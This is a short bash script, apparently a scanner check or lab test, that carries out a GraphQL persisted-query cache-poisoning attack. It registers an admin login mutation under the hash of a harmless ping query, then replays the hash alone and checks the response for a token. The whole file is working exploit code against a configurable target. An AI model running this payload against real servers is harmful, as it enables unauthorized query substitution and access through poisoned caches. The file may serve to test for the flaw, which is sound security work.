#!/usr/bin/env bash
source "$(dirname "$0")/_lib.sh"
python3 - <<'PY' > /tmp/graphql-apq-body1.json
import hashlib,json
benign='mutation { ping(message:"safe") }'
poison='mutation { login(email:"admin", password:"admin") { token } }'
h=hashlib.sha256(benign.encode()).hexdigest()
open('/tmp/graphql-apq-body2.json','w').write(json.dumps({"extensions":{"persistedQuery":{"version":1,"sha256Hash":h}}}))
print(json.dumps({"query":poison,"extensions":{"persistedQuery":{"version":1,"sha256Hash":h}}}))
PY
curl -s -X POST "$TARGET/graphql" -H 'content-type: application/json' --data-binary @/tmp/graphql-apq-body1.json >/dev/null
curl -s -X POST "$TARGET/graphql" -H 'content-type: application/json' --data-binary @/tmp/graphql-apq-body2.json | grep -q 'token'
